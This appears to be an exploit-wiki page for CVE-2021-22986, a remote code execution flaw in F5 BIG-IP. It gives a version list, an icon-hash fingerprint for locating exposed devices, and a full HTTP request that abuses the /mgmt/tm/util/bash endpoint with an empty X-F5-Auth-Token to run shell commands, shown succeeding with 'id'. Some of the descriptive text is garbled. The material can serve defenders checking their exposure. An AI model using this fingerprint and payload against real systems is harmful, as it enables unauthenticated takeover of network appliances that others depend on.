# F5 BIG-IP Remote Code Execution Vulnerability CVE-2021-22986

## Vulnerability Description

F5 BIG-IP is an application delivery platform of F5 companies in the United States that integrates network traffic management, application security management, load balancing and other functions.



Recently, F5 released the F5 BIG-IQ/F5 BIG-IP code execution, risk statement for code execution, and the F5 security announcement updated BIG-IP, and several serious vulnerabilities in BIG-IQ. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">F5 BIG-IP 16.x: 16.1.0.3</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">F5 BIG-IP 15.x: 15.1.0.4</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">F5 BIG-IP 14.x: 14.1.2.6</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">F5 BIG-IP 13.x: 13.1.3.4</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">F5 BIG-IP 12.x: 12.1.5.2</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">F5 BIG-IP 11.x: 11.6.5.2</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">icon_hash="-335242539"</span>

## Vulnerability reappears

Visit the login page as follows

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313153222032.png)



Send a request packet

```plain
POST /mgmt/tm/util/bash HTTP/1.1
Host: 
Connection: close
Content-Length: 41
Cache-Control: max-age=0
Authorization: Basic YWRtaW46QVNhc1M=
X-F5-Auth-Token: 
Upgrade-Insecure-Requests: 1
Content-Type: application/json

{"command":"run","utilCmdArgs":"-c id"}
```



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313153222086.png)

Successfully executed command id
